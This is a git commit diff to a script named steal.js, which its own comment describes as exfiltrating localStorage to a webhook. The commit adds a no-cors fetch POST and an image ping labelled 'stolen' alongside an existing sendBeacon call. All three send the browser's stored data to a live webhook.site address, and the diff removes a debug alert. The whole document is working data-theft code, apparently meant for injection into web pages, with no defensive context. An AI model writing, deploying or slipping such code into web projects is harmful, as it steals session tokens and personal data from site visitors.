10777ef86256928619bdcc7d1fb31c2d5e495e8c
Lilian <dornelilian@gmail.com>
2026-03-29 12:20:28 +0200

    Triple exfil: fetch no-cors + image + sendBeacon

--- steal.js
+++ steal.js
@@ -1,6 +1,9 @@
 // Exfiltrate localStorage to webhook
-alert('steal.js loaded - keys: ' + Object.keys(localStorage).length);
 var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
 var d = JSON.stringify(localStorage);
+// Method 1: fetch no-cors POST
+fetch(w, {method:'POST', mode:'no-cors', body:d});
+// Method 2: Image ping (small confirmation)
+new Image().src = w + '?ping=stolen&keys=' + Object.keys(localStorage).length + '&ts=' + Date.now();
+// Method 3: sendBeacon
 navigator.sendBeacon(w, d);
-new Image().src = w + '?ping=ok&ts=' + Date.now();
